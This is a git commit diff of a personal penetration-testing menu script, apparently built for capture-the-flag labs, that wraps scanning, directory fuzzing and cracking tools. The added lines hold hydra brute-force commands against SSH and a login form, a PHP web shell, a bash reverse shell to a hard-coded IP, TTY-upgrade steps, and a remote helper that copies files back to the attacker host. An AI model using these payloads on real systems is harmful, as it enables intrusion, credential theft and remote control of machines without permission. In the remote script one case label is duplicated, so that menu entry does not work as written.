8ebc9bdc4c79f033f56e5fbb949285e513ace613
ken <kenken17@gmail.com>
2021-02-23 01:51:18 +0800

    Add in more commands

--- handyman.sh
+++ handyman.sh
@@ -2,33 +2,43 @@
 
 EXTS=.asp,.aspx,.bat,.cgi,.htm,.html,.js,.log,.php,.phtml,.sh,.sql,.txt,.xml
 
-COMMAND_1='nmap -sV -sC $TARGET | highlight "^\d+\/tcp"'
-COMMAND_2='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$TARGET/FUZZ'
-COMMAND_3='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$TARGET | highlight "200|30[12]"'
-COMMAND_4='whatweb =v $TARGET'
-COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET ssh -s PORT'
-COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
-COMMAND_7='ssh $USER@$TARGET -p 22'
-COMMAND_8='scp ~/Tools/linpeas.sh $USER@$TARGET:/tmp'
-COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$TARGET/login.php -d "key=FUZZ"'
+COMMAND_e1='nmap -sV -sC $X | highlight "^\d+\/tcp"'
+COMMAND_e2='ffuf -v -c -recursion -t 64 -e $EXTS -w "$W_COMMON" -u http://$X/FUZZ'
+COMMAND_e3='gobuster dir -e -l -t 64 -w "$W_COMMON" -x $EXTS -u http://$X | highlight "200|30[12]"'
+COMMAND_e4='whatweb -v $X'
+
+COMMAND_5='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $X ssh -s PORT'
+COMMAND_6='hydra -f -I -vV -t 64 -L "$W_USERNAME" -P "$W_PASSWORD" $X -s 80 http-post-form "/login.php:username=^USER^&password=^PASS^&login=Submit:F=Login failed"'
+COMMAND_7='ssh $USER@$X -p 22'
+COMMAND_8='scp ~/Tools/linpeas.sh $USER@$X:/tmp'
+COMMAND_9='ffuf -v -t 8 -X POST -w $W_COMMON -u http://$X/login.php -d "key=FUZZ"'
 COMMAND_a='fcrackzip -D -v -p "$W_PASSWORD" file.zip'
 COMMAND_b='binwalk -e file.jpg'
 COMMAND_c='steghide extract -sf file.jpg'
 COMMAND_d='7z x file.zip'
 COMMAND_e='python /usr/share/john/ssh2john.py key > key.hash'
-COMMAND_f='john --wordlist=$W_PASSWORD --format=FORMAT hash.txt'
+COMMAND_f='john key.hash --wordlist=$W_PASSWORD --format=FORMAT'
 COMMAND_g='nc -nlvp 4444'
-COMMAND_h='scp ~/Tools/handyman.sh $USER@$TARGET:/tmp'
+COMMAND_h='scp ~/Tools/handyman.sh $USER@$X:/tmp'
+
+CLIP_1='<?php system($_GET["c"]); ?>'
+CLIP_2='bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+CLIP_3="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+CLIP_4="export TERM=xterm"
+CLIP_5="stty raw -echo; fg"
 
 show_menus() {
   clear
   echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
   echo "                                Handyman                                      "
   echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
-  echo "  1) $COMMAND_1"
-  echo "  2) $COMMAND_2"
-  echo "  3) $COMMAND_3"
-  echo "  4) $COMMAND_4"
+  echo "  Enumeration:                                                                "
+  echo "  ------------                                                                "
+  echo "  e1 - $COMMAND_e1"
+  echo "  e2 - $COMMAND_e2"
+  echo "  e3 - $COMMAND_e3"
+  echo "  e4 - $COMMAND_e4"
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
   echo "  5) $COMMAND_5"
   echo "  6) $COMMAND_6"
   echo "  7) $COMMAND_7"
@@ -43,12 +53,27 @@ show_menus() {
   echo "  g) $COMMAND_g"
   echo "  h) $COMMAND_h"
   echo ""
-  echo "  x. Exit"
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo "                                  Links                                       "
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo ""
+  echo "  http://$X/robots.txt"
+  echo "  https://gtfobins.github.io/"
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo "                                Clipboard                                     "
+  echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
+  echo "  c1) $CLIP_1"
+  echo "  c2) $CLIP_2"
+  echo "  c3) $CLIP_3"
+  echo "  c4) $CLIP_4"
+  echo "  c5) $CLIP_5"
+  echo ""
+  echo "  e(x)it. Exit"
   echo ""
 }
 
 runV() {
-  tmux setenv TARGET $TARGET
+  tmux setenv X $X
   tmux setenv USER $USER
 
   tmux split-window -v
@@ -57,24 +82,21 @@ runV() {
   tmux send-keys "$C"
 }
 
-runH() {
-  tmux setenv TARGET $TARGET
-  tmux setenv USER $USER
+runC() {
+  echo "$@" | xclip -sel c
 
-  tmux split-window -h
-  sleep 0.1
-  C="$@"
-  tmux send-keys "$C"
+  echo "COPIED!"
 }
 
 read_options() {
   local choice
   read -p "Enter choice " choice
   case $choice in
-    1) runV $COMMAND_1;;
-    2) runV $COMMAND_2;;
-    3) runV $COMMAND_3;;
-    4) runV $COMMAND_4;;
+    e1) runV $COMMAND_e1;;
+    e2) runV $COMMAND_e2;;
+    e3) runV $COMMAND_e3;;
+    e4) runV $COMMAND_e4;;
+
     5) runV $COMMAND_5;;
     6) runV $COMMAND_6;;
     7) runV $COMMAND_7;;
@@ -88,7 +110,16 @@ read_options() {
     f) runV $COMMAND_f;;
     g) runV $COMMAND_g;;
     h) runV $COMMAND_h;;
+
+    c1) runC $CLIP_1;;
+    c2) runC $CLIP_2;;
+    c3) runC $CLIP_3;;
+    c4) runC $CLIP_4;;
+    c5) runC $CLIP_5;;
+
     x) exit 0;;
+    exit) exit 0;;
+
     *) echo -e "Error..."
   esac
 }
--- handyman_remote.sh
+++ handyman_remote.sh
@@ -1,6 +1,8 @@
 #! /bin/bash
 
 COMMAND_1='find / -perm -u=s -type f 2>/dev/null'
+COMMAND_2='ss -tulpn'
+COMMAND_3='scp $FILE_TO_SEND $LHOST'
 
 show_menus() {
   clear
@@ -8,6 +10,8 @@ show_menus() {
   echo "                                Handyman                                      "
   echo "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
   echo "  1) $COMMAND_1"
+  echo "  2) $COMMAND_2"
+  echo "  3) $COMMAND_3"
   echo ""
   echo "  x. Exit"
   echo ""
@@ -23,6 +27,8 @@ read_options() {
   read -p "Enter choice " choice
   case $choice in
     1) run $COMMAND_1;;
+    2) run $COMMAND_2;;
+    2) run $COMMAND_3;;
     x) exit 0;;
     *) echo -e "Error..."
   esac
